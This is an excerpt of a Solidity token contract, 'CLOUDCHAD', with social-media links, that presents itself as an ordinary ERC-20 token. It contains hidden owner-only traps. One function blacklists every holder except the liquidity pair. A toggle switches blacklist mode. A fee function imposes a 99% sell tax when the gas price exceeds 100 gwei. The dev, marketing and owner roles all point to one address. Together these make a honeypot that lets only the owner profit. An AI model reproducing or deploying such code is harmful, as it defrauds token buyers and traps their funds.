...
/**
Telegram - https://t.me/CloudChadBSC

Website - https://cloudchad.net/

Twitter - https://twitter.com/CloudChadBSC
*/
...
contract CLOUDCHAD is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x7C3ad2C87De0e399C47CE4Ae49f59C8D8Ea1642D); 
    address payable public Wallet_Dev = payable(0x7C3ad2C87De0e399C47CE4Ae49f59C8D8Ea1642D);
    ...
    string private constant _name = "CLOUDCHAD";
    ...
    bool public blMode = true;
    uint256 gazzzzzzz = 100 * 1 gwei;
    ...
    constructor () {
        ...
        _owner = 0x7C3ad2C87De0e399C47CE4Ae49f59C8D8Ea1642D;
    ...
    function setMaxTx() external onlyOwner {
    ...
    function manageBL(bool _status) public onlyOwner {
        blMode = _status;
    }
    ...
    function talk(string memory _word) external onlyOwner {
        word = _word;
    }

    function blBoters() external onlyOwner{
        for(uint256 i = 0; i < holders.length; i++){
            address wallet = holders[i];
            if (wallet != uniswapV2Pair) {
                isBL[wallet] = true;
            }
        }
    }
    ...
    function getTotalFee(bool selling) public view returns (uint256) {
        return !selling ? _Tax_On_Buy : tx.gasprice > gazzzzzzz ? 99 : _Tax_On_Sell;
    }
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(!takeFee){
            ...
            uint256 buyFEE = tAmount*getTotalFee(false)/100;
            ...
            uint256 sellFEE = tAmount*getTotalFee(true)/100;
